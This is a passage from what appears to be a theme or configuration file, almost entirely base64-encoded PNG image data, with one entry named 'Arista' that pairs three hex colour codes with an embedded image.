e9DHRoBMABh+ph9ISiSvqinIDwv8DxDlpA8rLwwWuM5Nk1QNiAP4IAgnGpPxVZsDRQqQIAAAQIEOHgJyA5sXHV1F4Ant79QuhzAUhTmH8/L3nsn0FsuYCWamqimpiBRNECAAOPoh7BNQD2IFcY4FQC2ARBJn4aPbqmtu6UyWr6VxI2C3hdOjdxHb7TC0FRa2W5DW1OAAhiYYDADBAgQIECAQ4WAOBdfhhX/EbL9DLRNH8Xq1S0ArkfL1lS13PHTYMQCBAjwiohBLSlW/zbGnCTqQxXlZSspeCSGoQSroLASQDXJsnjMy6fBW0iWWqvfSF7tVmwlgipYAQIECBAgwEGLIGIkQIAA+xQV0fIFhrgZwEJJFxF6XsJyEE878td7TjhM658uYTrAkDG8CIAD4P21jY3P+X7QByRAgAABAgQ4mOEEQxAgQIB9ie7eno7c7NwWkieSOEvACMgHU+JpVaP0bSgSNorbOA2XOYZfJpAm6WIv5j3U3dejgHwECBAgQIAABzeCE5AAAQLsc7tSWl7OkHAyoG8bmuUQ2qy1dQI6QGQZMkqy2MrWUbhmdDR+b+PW5lgwdAECBAgQIEBAQAIECBBgUkidnspZ6TPzjTFn0uItAuYaw7AkD0I9DR6Qtff39PfVd3b3+MGIBQgQIECAAAEBCRAgQIC9ti/p6WlMTUl10tPTp7lkGqURP+51dfb3xfsGBsbCrYKwqwABAgQIECBAgAABAuw7IvIKrwebIAECBAgQIECAAAECBNivZCQgHQECBAgQIMAhjP8PcNSiVIqFSJkAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjItMTAtMTdUMDI6Mjg6MDMrMDA6MDAn+/HhAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIyLTEwLTE3VDAyOjI4OjAzKzAwOjAwVqZJXQAAAABJRU5ErkJggg=='
										["Arista"]='#000000 #2E4053 #BDC3C7 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAB+CAYAAADcHHVyAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAA4+ElEQVR42u2deXxU1dnHf8+dJUAkgZCZCYs7uKUGZiZIEWujtVpel1rtKJmZpKgVtOC+oKIS911RFgE3JDMTbKxv+2qL1arRVinCTBDL+7YSd4nMTGQJazIz93n/gK5CSMKcmbmT5/upn0+B5Dz3/s6555zfveechyAIeYi90v9DYvygyx/S9W06kMj81dEOjbijOz/JrO1iTd+5v5/TmHeBab8/p2u8i//z50hjk6Zv/vsfk53mjqSe3PH3P28Z0roVTU1JaVU9p7TSfzTpeq2SwjW8G18V+l0+6jZkdO1w0hIjTZo2HMwHMbRiEPcn0ABpVRmAU+9GIw0vqw9UpzmcH90CTTtIRDcmlEzVb/igYW2+3E9JhW+E2cwnEHAoMw0C0TYiXp9Kmla1fbBkHQCWWk8PZpEgfThcvu/qhDPBmEDAkQCKCdAZ2MTA/xLx28zar+ORQIuopRgdExg8o+uek0DZGt+7G5kYxNS98qg7xe3lnpnBqX/+rcmUgsn0zz/b24cDLt8/lCVgyz/jogPAjn8pbSsByT3XtBPgXQDaGdRJQDvAm0H8Gev0mZm0z0wFuz77annjznxthiadRzHoFiVtSMdsAIY3IKXOScNM0E5mopMAOhHgo4BUIaCBGdjdsHnP/2TszwApLYX6TASyu9Zdz6C79lS0YESvatJWADC0AXFU1BTCrF/KhJ+BMQYg/KPrAYMZ0Ewp2F2+FhAt6ejU5275MLRJal8MSJap0+zOj3xEdAsDxxD/58QQADCYgCPAdBaBH3S4fL9LsVbX1ly/SvQTDIbGwOCuzdC3/x/968SRCURACjpSHVbYXb6vCfQnEN7VkQoXb9m8sqVlWYdInccva8Z6j0BKm8TgSQCO31ubEbIDgZdk4o12mdN3nA7cIYoL2WzuDrf/Emb9HgD2bnQ/I8F8Z4GZrra5fLfHI8H50mmJAcnOIOr2Hc+8bjFArh60QGLgTI30HzncvvkDt2y8QSZbQh9nKIM9YHgIGtqLSjY7XP7XmfEKd3a8FF/buE0kygOqqsyO9uHnM3AVpzBexu2cZFfCpM9SHsU9xcK8fQmAfiK5kA1GjPeUdHZYQ8x8Ri9cegkBcx0u38RO6vRtCjduEUV7jiYS9A6byzuZmVcCcPWyCBMzrmgvKnm71O0fKooKwj8YxGAPiJ+nAusGu9MXdLh83xVZjMlhVZP7Odz+q+ztw9cxsBTAeFElV6G5G1cu/VJ1FIe+/U4G3KK3kA0cY71HdHZalgM440DKYeBMCxe85aiosYuqYkAygt3tu51AzwFUkIbixpmY37SPq3aIsoLwLQpB8DKw3O7y/dnh9Fejqkq+3BploHdVn72jPbGWmWcDOEwUyWk2W8za/crHzzH+E5lwg8gtZIMho2uHs05/ANNR6SmRnWzmVx0VNYWirhgQxebDez04vetWGTgGCdOyEeM9/UVhQdi3WWfikH3rsLU2t9cjcuQutjHeUTaX702G9j8AjhBFch8mPLj+/SXfKDWkFTWF0HgxAJMoLmQaR0VNocmUehWMw9P89DjZrC8BsnaujRiQvG+8Lt9ZYHpQUffv7OywzheVBWG/M6WjiOmXdqf3tbLR1eUiSG5hd/prSaMIAaeIGoah1YLCx5U/umZ+FMAokVvIytBhSc0H8B1FxZ/ncPsvEZXFgKSdkrGTDmbG84od7mTHGO+PRW1B6AZEP9RNWrPd5a8D6qQvyzK2cs9BDpf/lyB+HoDkdTDSowS+ozW8aIdSY+r2nQ7wpaK2kA3sbv+5YKpVGYOZHykZO+lgUVsMSFoxp0xzQShR7tA1mj/Y7SkWxQWhW1gAnmV3rXttyOja4SJHlszH2MllWoG1icGyNM5w7oM/iha1PqsyxPATaoeAsRiyREXIAqUTLh4I8JwMhCoyp0wLRXExIOkbXF3+CwCck6Fww8xskbPRBaFn/MBkSq20VU5yihSZpczpO45SiT/LqUYGRdduQVNTUmWIZDI1H4Cc9ihkBdPOXfeCMSJD4Sbanf7zRXUxIAdMyThfEYEfzWRMAl1hd1bLUZWC0DOGkm56x+by/0ikyAy2Md5ROuENAIeKGgaE8X6sOfCSyhB2l9fHwAUitpANysb4xjLo8owGJZ47aMzkQaK+GJADwpzAgwCGZ7xeyLQA7ikWqQFB6BEHEfg3dpf3PJFCLSVjJx1MGr0OoEzUMCZE2s1QmBFyyOja4WB6QpQWskJVlVnXaCEyf+pamVVL3CMVIAak1zjcNeMAZGnTHFfYse0qqQVB6DFWgBrslf4fihRqGOauLjWnTG9CvnwYmVejkfo3Vfobkyn1dCb2TgrC3rBtHX49wNlalnuZvdI3QWpBDEiPKS/3WBn6M1nViOkOx1ivnKEvCL0xITq/WOr2u0SKdFOnJVmrBzBStDAsOmupW5RO/py+6QBkOaSQFcrGTDqMGLdmdX6tQ1ayiAHpOfF+BTPAyHaOgQGconlSG4LQK4qI+dcjxnvkDWwasbtabpeJpeEJxVctbVZVeGml/2gi3C8yC1lz2JppIYBsZyf/jg3br5faEAPSbWxjvKPAfEuOXM6PHE7vJKkVQeg5BByc6LBKhtp09Y1O78kA3yZKGJpOSmq3Kyu9qsqs6fw8gAEitZAN7C6fH8DpOTEGMc8qrfQfLbUiBqRb7YU0ehJAv1y5IAbNLj7eO1iqRhB68/zgTJvL9wtR4sAoL/dYiehJGTeM/jzwk9E19Z8qm/y1D5sJYJwoLWSDPV+8H8mhKWUBpXgB5CWYGJD9YXP5JwP4QW5ZIjgKLPSA1I4g9PYRwv2SqPDAiPcrmAHgOFHC0GwjC9+nqvDde65opsgsZIvODusjAOw5Nf4QquxOr19q598xiwT/ZJi7ujTJyNWJ/s/L3N6GDeHQW1JTgtBjDjKZUvcDqBEpetM31h6S5FQ2lqUyGJtA2EzAJgY2SW0ckBP/79iKhqiq4k3gyQy8nVeaMYpAOEFR2VEQPjS0PhpiuXIppc7q7wP4WW4+e/RYmdPz6obmxrh0RGJAvkWSTbMBtuXq0KEzPXlY1eQxnzUt3iW1leUxiXA3dN4mSnSn30U/Iq0/MwYD3B+ADcCxyPwRrj67s3p+rLlhudRKT/vG1I3IzLLUJIA3QXiXmd4vKOh4/6vljRulBoxBNBy8Mt/uqdRZU6lBX6lmHKG34pFAtbScA2fkyIkFW0lbwLm71GmITtYHAVwktSUG5N8oc3tP0Zm9OX6ZR+/YmrgRwJ1SY9lFS2hzomvqY6JE7ykZ5yuyJLVjddYrNWAig08DqEClFwJpsyAnOPVsAub2DwXzJYrDrAfocTOlnmsNN7SJ6oIg9IQtxSW3EuOYHL/MnzmcvkC0OfiG1JjsAQEAjBjv6a+z9hSMsEmI+ZahrppjpdYEo7NxRbA9Gq5fEY8E50UjwbMsZvNwEN8AKP2kf7rD7Tte1O/BIMG4Fuq+fuwCYZa1oHNULBJ4SMyHIAg9pbTSfzQx32CASyUmPHlY1eR+UmtiQAAAic6CWQAfaYyrpYIUdDlRQcg71r+/5JtYOPQwd3QeCdBjAFjJAKDjOlG7m+xOoqVqTXUL6zw+Fg7e+dXyxp0itiAIPadO03Q8rfjreToZtX1rQg5qEAMCONy+45n5WoNd9sl7TusShLwjvrZxWywSuFYnOhvAjvRbEFxYMs5XJEp3o3/Ud0xUsi+OsJqS2oT46tBqUVkQhN5id7VcCvBJCkPoae/+GDeWja4u7+t118cNSJ3GjKcAWNSUT8pOOyDmhx0VNXYIQp7SFg78Vmf9vwB0prnofuYEzhGF9w+TXqug2M9h1n8ke6gEQTgQbGMnlxHUHSsNRpQAFXuDrbpJewao69Nz8D598zbnumlQlTCJsBaUGA9gm6LyS9jMj0oXJOS1CWlueBuMq9I/rtAFom7X7F6nTP+V5mKTmg6PyqNgBUHoIxPYVPIJBpQlaSYN10YjwRcAvKSg+HEO10c/FwPSByl1ThpGhLtU+WYNfEUs/MLHINSpuwv2lbr9Z0o3JOQzsebgQgB/TK9/108fMd7TX9TdN7u2Jb8LIL0aET+xYXVwpagrCMKBYHP6JjLYo8x8gN6OhoMNAJA0pa6GgpfJDHqwLyfI7bMGRCNtHoBiJbaA6Nm/JwyMDVz/OEDNyu6Dea6joqZQuiMhj2FmvjXNw0vBrl3mE0TafaOn9FPTXOR2SpgeEGUFQTgQhrmnDCAN8xQOOR1JSl2GPQehbFy59EtAyQvrYrMp1WdXsvRJA2J3+X4C0LmKiv/GpHfc/I8/NTUlNZ2nAkgpincYTPqtEIQ8Jt4ceifdRt5E2kmibFcejarSWx7qZd+HIAgHSoK33wPG4QpD3PdNuOGv//oXsaL1jwK0Ju1WB7jA4ao+WwxIH6BknK8IhCeU+Wbw9RuaG/9t8/mG1cGVBH5SWUzC9bbKSU7ploR8hokb01zgiaJql6Q3X0qK6kVSQRAOhFJnTSUBVygMsW5AkfXbX2qbmpIMTIeC4+EZ2lxbuecgMSB5jjmBe8EYoaj4P8Yjoef36tgtNBPAelW3Bd20EB6PSbonIW+h1KtpNjTHiKh7xz6u2gFgUBqL3BIb1bFClBUEodd4PCaN9IUAlM11iPkXnzUt3rW3f4tHAn8EEFAQ9hCyWuvEgOQxZZXeEwBcpqj4To1x2b7c8cYVwXZmXK3soQHG2j62XgZByFPiB234EEA6E9YdsifRnvCf5ixhOirNRb6HxsaUKCsIQm+xf2K5BoBLYYhAtDn0hy5/wqLfAGCzgknc1aUur1sMSD5SVWXWmZQ5ZwY/vKE5+L9dTqCagy8C+B+FJuTekgrfCAhCPtLUlATwURpLNNt4x6Ei7F4Zmd7+EX8TSQVB6C3D3LWHgGmWwhBbdKIb9/dDsRUNUQbdpiC+SQM9g6oqsxiQPMO2dfgNYIxRVPznWtJ0b7dmPGS6AqpygwBFZjMel65KyFcY+DKtpl1jh6i6t4FBH5TWAok/FVUFQegtCdbnAlC4T4JmtIUDX3fnJ+ORkfPBeF/BRYx2tA+fLgYkjygbM+kwYsxU1myB6dE19du787Ot4SVfgPgOhbd7nt3tP1e6KyEvIUpvAjudDxJR92L0iAamtdp0bbOoKghCb3A4vZMIrOykKAZWxiIjn+r+b9TpOrRpUHC6KQP3OCpqDu8L9donDIhO2iIASnJlEKgxGgm+0pPfiQ1sna0yNwiY5w92e4ohCPnWYbG+M73PiiYGZO+jYGF6ZU5zvQmC0CcY7PYUM9EjCkMkoaWmAnV6T36prbl+FYCnFVzPADbr8/pC3ea9AbE7vTUg+qGi4rcmU9o1Pf4t9blBhlp1653SdQl5Ny9m6kjvGwSWbOh7k4XSmwFd0zWzqCoIQk8x65aHAQxTN6jg8fiqpb16IdyR4JsBqMhtNNHm9P1UDIiBGX5C7RAQPays3RLf+s0HS3p1tG4GcoNMtzurx0v3JeTXzBhpNgy8Q0Tdq9Dp1YVkqZsgCD3D5vJ/j4guUec98CV3dtb19ve3fBjaxKCblPTAhDmDxkweJAbEoCQSqUcA2NXMgxCOH5E4oM9kinODaCDTAjlmVMiziXG6lxZuF033NjLz1vQWxweLqIIgdJfyco+VwAt2T7cUjSZEV8bXNh7QoUDxSGAxgd5WcHllVkrem891nLcGpNRZ/X0QahUVr4O0aQd6rr3q3CAAV9h5x9UQhPyZGB+W3h6Qtomoe+ngKL0GhIiOFlUFQej2xL7AcjOA4xSGWBYLB36djlEJGk0HkEi/Q+Kp9krfBDEgBmLkyIkFJtKUOWcizIuG69OS1TfeHHyRQS8rnLHVOcZ6j5DuTMgDCMCx6X2W+WuRda8OpDWtvRAwQUQVBKE7lI6uPQqKljbtYQcltWnpKiy6qv4vIJ6jZI6uY0F5uccqBsQgbCkquY2BYxQVv6EjZbk9nQVaSJsOdblBBnCK5kuXJhidstHVx4FQksYiE9HC1i9E2W9j0vX/S3ORw+2u6gpRVhCE/UCaKfkkgH4KQ9RF19SnNTeR3q9fHdQsqf9OW0HB9WJAjDFJKSfgBlXlM+iqzasXb05nma3hJV8ApPLUqjMcTu8k6dcEI8Mm7dw0F/n5nuzqwn8wJJlcByDN2mh+UVYQhK5wuP2XAHSqwhB/idGA2ekutO3dZ7cScJ2aead+e2mlP++WseaZAanTdE1bCEDV56rX4pHAL1UUHCv66jGVuUEYNLv4eO9g6d4Eg0I64EtrgcDfRNa9s3ZtYyeAj9Jc7FTpgwRB2BfD3NWlzHyfwhA6dJqK8KKEisKjkeALAJYpGP4KKKV2Q74YkAPE7v5oKkjZWuOdoOQvlF286twgBEeBhR6QLk4w5rPt/zGlef8HgOWibJe8lebyigosdLfIKgjC3khCewJAqboI9HRsdeA9lffAoCsB7Er7lROq7E5vXn1FzhsDYhs7uQxMyo4sI+CeWPiFj1Xew4bVwZUAFigM8XOHq+ZUCIKBGDlyYgEpeCumM/9R1O2iz9P5dQXFXuZw+c4SdQVB+FfsLu8ZYFQrDNFmptRM1fcRjwRamKAm/xzRY2VOj00MSM4Nlok5AAapKZw/Gti+8eFM3EfSglugLjcIMaWePKxqcj8IgkHYWjT4YQWHSnRatINWibr7JlFAbyH9R0tqDITsY/wnisKCIADAMPeUAYDiw3KYr20NN7Rl4n4KrJ33AvhEQdFDdFgfEgOSQ9icvolgqEpbz8Smy1talnVk4l42rgi2M/E16h5COmrH1sSN0uUJBnm2r2DQdAVFv9EaXiRZ0PfTF4HwOwVFD4TGr9mcvp+KyoIgJHnHHQBUpgt4J9YcCmTqfr5a3riTQdOUFE74mcPpPU0MSA7gqKgpJA3zFIZ4PhqpfzOT9xQPhxqV5gZhvmWoq+ZYCELuQja37yYiPK6kcOZficTd0Ul/RlHRhURotLu9z5e6/UNFaUHom+w+npuvUhii0wTtMgCc0XlcJPAqCL9RMoUjmp8PK1kMb0B0c+oeMA5XM1HHRkpqM7JxX2pzg1BBCnrenagg5AclFb4RNpfvf4hxn6I2mjRbzL8WpfdPtOjrZQBalQVgqtWY19ldvrllo6vLRXFB6EvUaYC2EIBFXR+D+7+O1P9fNu7ODNOVALYrKHrU9q2JmUavfUMbkFJnTSWpWZ6xe5oOvjG6pj6WjXvLQG6Qk21O30XSAQq5QpnTY7M7vXeazfg/AlRuVH55/ftLvhHFu0FTU5KZn1AcpRDANN2k/cXu9v3F7vLNtbn8F9md/tGoqjJLJQhCfuJwrbsSwHcVhmgZUGy5L1v31xpe8gUT7lEyP2XcZHf6Rxu5/o3buVdVmbV2fSEAkyL78adoc/DZbN5irOirx+ztI6oBdqoxWHjIUVHzSrZMliAMc1eXJnStijRcqDPOgtLst7th0GOifPfRUqa5bNKvAcEB9ZVTDqCcwAAB9vbhnXD52gHaQuDNDGxGhpdSZAti6gRhu05oJ+YOBm8mwldgfKKnzJ8O2h7/PFN7EwUh3ZSMnXQwp3Cn0u5E46s+a1q8K5v3ad/V+UiswFqj4Bh5M4gXAnUnAnW6GJBMVmr7iGsAdikqPgnG9KwPdE1NSW2Mb6quYbkSo0UoYTM/CkAyFGeizbovPJJ00+F98d4ZWjFBH8QaDWLGYA0YpQPHJxnHEIEy9aQREI5FAnL8bg+Irqnf7nB5H2DQo1kIbwVQCnAp97VnhniPEfl726V/jEiaKYX2ohLd7vL9lYmWQ+f3zKQt/zpS/9e+YtAEY2PWTXMADFTY2TfEV4V+l+37XLu2sdPm9F4Goiakf0nxOLur5dJYBAvFgGSIoU7voSnw7craLePhaHPgg1y41w2rgyvtLt9CAIqSILKv1O1vaAsHfitdolo6Ok0bC8wUAuGEvmhBeM8EivbMkLKxAYmZ7pOW2HMGtm+av6Wo5FIFb/GE3qMBOI6YjwPhkhR02Fy+LwF+CdB+FY+MfNeob0aF/Mbm9P0UjB8rDNGu66nrc+V+482hd+xOXwMIXgWj2oNDRte+8s0HS9YbrR0Ycg9IkmgugIMUFf8FUlpOZetNWnAz1OUGgcY811FRUyjdolq2fBjaxJ2dP+D0Z5gWusfyWHPgJZGh57S0LOsgnX4OQCa0OQwBBxPoKgK/Y3etW+9w+u4tqfCNEGWEXKFknK+ICLMVPwg3tzUvbc2pG7fq12L3EtJ0U2Q2pR41YlswnAFxOP3VKjeoEvTp0TX123PpnjeuCLYz6FqFIQ6DSb9Vukb1xNc2brNQ4VlgJVmmhX3D0Ol6yPKUXhNbHXiPGHNFCcNQxoSbzWZ8YnP5lpZVek8QSYRsY+6k+wEMVzeH41WxIzpzbklSbEVDlIlnqRnccIHD6T9HDIhCBrs9xUysMCM5/yoaaXg5F+89Hgn8UmVuECZcb6uc5ISgnNbwoh0Diq3nENPvRI3MQMBzsdWB90SJA6N/sWUGAytFCUNhIeBCXacVNpfvZZvLP1IkEbKBw10zDsRTFYZIpUibisbGVE7O445IzAOoWc0cjufYyj0HGak9GMqAmHXLwwCGKSp+azJJV+f2KKIyNwjM0E0L4fGYICjns6bFu0o7O34CSEK8DLiPTxMWXCNCpKfdpkyp8wHIyXnGNOJnEXitzeV7rHTCxQNFESFjVFWZmfWFKuedDMxpCwciOatBY2NK03kq1CxlPYT6We4QA6IAm8v/PSK6RGHHfPvGNcGvclmD3blBcJdCDcbaPrZeJj1lZli7trEzdmTiQhAvETWUoeu6ftHGFcF2kSI9bFy59Etm9gDYJWoYEisBV2s7O1bb3NUniRxCJnC0D58BQGXeiq+T1FmX6zpsWB1cycxqUjwwXVXq8rrFgKSR8nKPlcAKM3fTmmjRekOsbY4VrX9U1Se8PSZENi1mksbGVOyIxMUEfk7EUNEfY2Zbc8PbokR6iTeH3mHGeQBLHgrjcgSx1uRw+++XhI+CSmxjvKMYUJu5m+mKTeHGLUbQo6BfYgZAcQVFmzTQM0Z5ng1hQOIFBbcAOE5R8To4dRmampKGeJKbmpJ7PuGpWuNYZDbjcekyM2tCopHQJcR4QsRIp5nm5+Lh4P2ihCoTElzG0M4VE2JoTMw8w94+fNmgMZMHiRyCkr5Yo/kA+isM8WqsOWCY5cxfLW/cSIRbFBU/2tE+7AoxIGmgdHTtUQDPUBhiQay5YbmRHuYNq4MrAaWJZ86zu/3nSreZUTjaHLwaxI+KFGnhjSgdNFVkUGxCIoFXoWlnE7BJ1DA0p1m0xHuOsd4jRAohndhc3skATlMYYieZeJrRdImGA88AUDL3ZNDdjoqanE96nOsGhDRT8kkA/dRM+RDt1C0zjfhQq84NAub5g92eYuk+M2tCYuHQdcx8k0hxIE0XTXr/gp8gvCghaqgntirwekqj8QDWiRrGhYBjOUnvlVb6jxY1hHQw/ITaIQTtQaX9PeHO6MrQJ0YcqogwFYCK1TcD2KzPEwNyADhcvp8DdKq6Dpeu2bx68WYjPtgZyA0y1Kpb75QuNPPEm0MPiAnp7TsFermw2DKx7d1nt4oamaNtVeBv1oLO7wKQRI/GdiEOTec37O4LjxQxhAMlkUw9BrBNYXtdG0fhI0bVJxoOfshgVUZhos3p+6kYkF5gH1ftAPCAupkKvx5tDjQYeqKqPjfIdLuzerx0o9kxIQS+FpI4ryfMjxd9dd5nTYvldKYs8NXyxo2xSPB8ADVQk/FXyAzDweY3hoyuHS5SCL2lrNJfBcCvMARrRNON/qWb+/e7DYCSrO1EmFN8vHewGJCeVkrCNJsBRcJxh27SrsiHh3xPbpDtytoHmRbAPcUi3WnmiUZCjxH4Mqg5Mzyf2EZM3lgkOM0wh0nkMbFIMJBKmb4DRkgMtGE51GRK/WrkyIkFIoXQU0aM9/TXdX4Kyk4uBZjo2Q2rAk1G16rt3We3EuEGVT6wwEr35uq95+RRXTaX/0cEnqQsANG9basCf8uHB701vOQLm9N7FxEpOu2HK+y84+oY8JB0q1kxIYtsLm8ngZ4GIEkiv/0wN6co5f0m0vBX0SJ3+OaDJesB+Epd3kcJ9BABp4gqhmNce9GQJwDIYQ5Cj0jsst4Gwkh1EbiDgF8aKefFtybfnPhiQ3NjHACi4WDI7vJdDOAH6ZcKU+yVvkBsVfBdMSD7wVFRU8jQn1QYIgkANqd3hlEbrmYy/Ta6qv4vf/9zvLj1EXv7CC/AFYoe9jpHRc2L0TX1n0rXmnnikdBim8u/g8ABAPI1ajdbiGhW9IiOuWhsTIkcuUlbJBQGcGpZpb9K1/lKAOeIkTYSPMXu9P4p1hyqFy2Ebs3hKmu+w7p+vdooVADG7zV1H1iUj19JmP4ttQTrfDlp+BCgdH911MBYWF7uca1d29gpBqSr7s7MdQAOU3rPjDuIDNpwCZ+auP+cf/u7pqYkuXxTGXgXapbVDWCzPh/AROles2VCAr+0u/2dYH2pgg7KSCQIqGeLfkt0RUMUYWkbRmDPUokmR0XN4bDwVAZfAMbhoowRxhx6zFFR8/vomvqYiCF0TZ3G+rqFkBdl+3uoZrQ1L/23fR/x1aF1DqfvUSbcnP6JNcrbCqw3ALgnl1TIqT0gdld1BcBXSePsotkyrmwNL9rxn38fjQT/DCaVuUF+5HD6q6UGskcsHPj17sRv2Nn37p47AFpkJtPIaCR4SWxFQ1RahPGIrqn/NBoO3BQLB4/QidwMvpeAMNQcRSmkhyFs0WeLDML+sLnWXQ7gRFGiSzPwbiwy8qm9/ZNJK7wbwGdqwuJW2xjvKDEg+3DOgCbOucsGREujkeAr+/r3pJVvgsLcIEz8xDB3danURPaIRwKvasRnAtjWN9o8VoLpOjPxiFgkMLU1vOQLaQX5QVs4EIlHQjOjkWAlJbVBGvGpBJoJIABgORhiMnPnQax2uGpOFSGEfVHq9g8l4G5RokuSAE0D6vZ6sExreNEO0vlqRbH7aZqm9GCAnpIzS7AcrnVXMvBdaZ/7ZAtz8rqufmDjimC7w+W7joGlqvqYBEz3A/i5VEf22BAOvWWv9P0IOn4LIN+SRXaCsZLAr+qkLY1HAi1S4/lPdE39dgBv7fnvHwxzTxnQkdw1WDPp/Rl6MTEKNcDaJ+b8GmkMLtYYgxlaMYOLATqSiI8B4zuZHr+Z9TsBvCmtVdgbGvM8AINEia58PB6INwc+6LIvXB36jc3lf5nAZ6c/Pn/f5vbVxsPB58WA/GOQqT0kySlJetcFBL7xP9cM7rXxRoIv2Fw+PwFnKbkO5osdrppQNFIvA1EWia0KvlvqrDlNg/57EEoyahCA28D8NYi+S8A4Bkb20ghtB/AJwB+DtAjr+tsF/RIrv1reuFNqWAB2vxEEsEOU+HccFTWFMKXGA3Q2E84HoD5nB2GCvdL/w9iqwOtSA8K/Uur2nwnmn4gSXdJSUNDZrT0YFtKmJzl1KoDC9M/h8IijomZZLuzpygkDkuTUHAADpX3ukxXRyFFPd7tSmaeniE5R0XgBEFPqycOqJo+WhG/Zpa25fpXd6T8V4NcA2DMU1grgbgZ545HgtL//5WC3p9gK6yHMPIwJRWAUEqE/6ygC0TYwdkLjrWBtK2m8lcnycXzl4g1Si4LQc/Z8MfoDgD/A47nW3lJwLsA3gnCCUg+iYyYAMSDCP83HhIsHars6FogS+0GjX3T35VpreMkXDqf3fia6S8GVDGGz/jCA2j5vQGxurweMc6R17tufgWnqvtYM7o2vm0OfK80NwnTUji2JmwHMkurJLrHmwAellf6TNZ3fQCbegu7GQoSldqf/4lhzYAkAbAo3bgHw4Z7/BEHIFI2NqRjwKwAvOZz+SUw8W9ULCQafbBvjHRVfHVonwgsAYNrVcQ8zRogSXRLo6ZfD0s7Eg20FVh8Dxyi4nhq72xeIhYOvZdWTZTN4yThfETE9Jm2zqw4fD8T2s2Zwb8SLWx8BYbWyCyPcVDa6ulxqKPu0rQr8TdNTJwH4JJPjDoiftbn8F0kNCEJuDBfR5kCDTjQGwDvKen4Nk0VqAQDKxvjGMuMXokSXk7iNlNSu6+mvrV3b2AnmKxRe10JHRU1hNqXJqgExJ/EAMvfW1oh0e83gt2hqSmrEUwHoiq7Nqpu0Z3afXiZkmw2rl35mJtMpADK5adtE4GdsLt80qQFByJEXEuHA1wOKLGcw6GUlDoSoFjBuBjghTVRVmXWNFkISi+5nno8bervfItoc+gMDLyi6tMNg4dv6pAFxuGvGgTFFmmdXtdP9NYN7nZSuCr2vODfIOLur5VKpqNygNbzkCzZZvgfgLxkMSwTMsbm9V0oNCEJu8FnT4l2FReYLACxXMKMaYXf6K0Tlvo1ty7DrAHaKEl3yTrw5+NwBlWCyXA1gixJzxHydrXJS1uowKwakvNxjZejPIMcSIeYY9ek4bUR1bhCAHxwyula+YuUI8ZWLN1BS+wGADzIYlohptsPlvUZqQBByx4SkUiYPgM3pnznwaaJw36VszKTDiOg2UaJLOk3QLgPABzymg+9QdI1m6KaF8Hiy8hUrKwagzWq5EQzZP7DPOT02UlK7Ph1FbVwRbCfgOoVXW2Q26bKPJ4eIrqmPdeqWKgArMmlCGPSow+m9VWpAEHKDbz5Ysp6A9E9eGGJA+vIURTPNhZpTNvMIuu/rSP3/pWVML2qdo2pPLwFjbZ9YsrKMOuMGxDbGO4qJZkrj7OLhJro+nWc0RyPBFxh4RZ1fYo/D6ZeTzHKIzasXb05Q5xkA3stw273L4fbfLzUgCLlB/yLLAgCtaS62UpTtm9hdXh8DZ4oSXbJuQJE5feNgU1MShOk4wK8p+zQhTHeXjJ10cL4bECKNngTQT9rnPnknHgksTnehZubp2J34TdHEk+eUTrhYcrnkEJvCjVsoqZ2O3fkCMmdCmGeICRGE3OCzpsW7mPBsmostHeauLhV1+xYjxntKAHpUlNjfdAiXpztPWmxV8F0CL1Z0zQMtSXPGc7lk1IDYXP7JAH4g7XOfpGXN4N74ujn0ORPuVnjth9DODslmn2NE19RvL2rfeBaA/8m0CbG7/A9JDQhC9jEl9aXpLjOhJj+BkMMkOiwPI3NJbw0JgRdHm4NvqCjbbDbfAKBNkWv6L7vTf35eGpDhJ9QOIeABaZ5dNoF707VmcG/EB65/WGVuEAKutDurx0s95hYtLcs6bB2dHgAvZbg9X293+udDjuwUhKyy4YOGtQA2pLW/101HiLJ9h1Jn9fcZNFmU6JJviBMzVBW+/v0l3wCkbp8l8dxBYyYPyjsDkkimZgNsk/a5z4r/aECRVa1BU58bRAOZFsA9xSIVmlusXdvYGTuy8wIA9Rlu15fbXf4Fki9GELIN/zmtpYGLRdO+wciREwuItCchL5P281DwNRuaG+MqQ8QiI58C8GdFxZdZKXlvXhmQMrf3FAA+aZ37brbEprSvGdwbG1aF3gdhkcJbqbDzjqulSnOQxsZU7MjOiwj8XIab9xSb86OFYkIEIaujzMdpnTwQikTUvkH7wMEzCThWlNg3BHo71hwKqI9Up+tE0wCk1NwIT7VX+iZkQjOz6gAjxnv6d3ZoTwEsznmfDRfPRSP1b2YqXtKMGeYEzgEwTNFIV2d3X/hSLPzCx1K7uWdCosAlDrdvGzOuyFgbJ/q53b2uMDawqhZNTUmpCEHI8Dij0ZfMnM6HWg4d6QOUOX3H6YQZ6homviJG1ODunnWdL4WiU6r+k7ZwIOJweZ9k0HQFxWtgLCwv97jWrm3sNLQBSeyy3g7iI9VVOz+tado3Rm66ZpOW0c26G1cE2x0u37UMLFUUYgDYPA/Aj6T7zs3eMhoOXmV3+ZMAZy55IKPa1j5ci1dV+cWECELGSespiDqzPMN5T52mU8tCgK2KAuwkjb8fXRn6RLTu4dzaQjPNCZwHFS+SGeVtVsuNgNKDi9QaEIfbdzyz0iR4r8abQ5dKU+w50UjwBZvL5yfgLEUhzrC7vL5YJBQUtXPThMQigWvtLn87wLMyFZSAC+1bh5ti7ilehBclpBoEITPo4EQ6lyFooB2ian5jd7VcCvBJygYhwp0xMR+9YuOKYLvd5ZsBRfs6mXDrUFfNr1QejKRwTXadxowFAFRtSN5JJp4mzfAA3Kfi3CAAzZaz4nObWCRQx8w3Zdb64KcO3v7fh1VNlnxAgpA5B5LWPRs66dtE1PzFNnZyGYHvUzc9wNo4Ch8RpQ9k/A4GAFa0fJ8KdLDSgweUGRCbq+UXAE5U6Zzls92BkYHcIKUp1uTo5Rwn3hx6gKEuy+rePQjO3NGeeGnEeE9/qQFBUI+W7qUarG0VVfO4vaSSTzAwWNUQoIGvkK/gaagnpisAKNGRwd/fk7/POAak1O0fSuC7xDkbYPKpODcIAxc5nD5JPpnr7SASnAfQ5VB3RPPemNixy/o7W7nnIKkBQVCLTlSe3okPfyGq5ic2p28igz3qpnB4bkM49JYofeBsaA7+L4DHlNUV88OOiholySeVGBCN9fkABolzNgDqc4MQE56U5Ta5TywSWAhwLYCMbS4lQhUVWH9bOuFiOVFHEFRRVWUm8PfSWqaZPxVh849h7ikDSMM8Z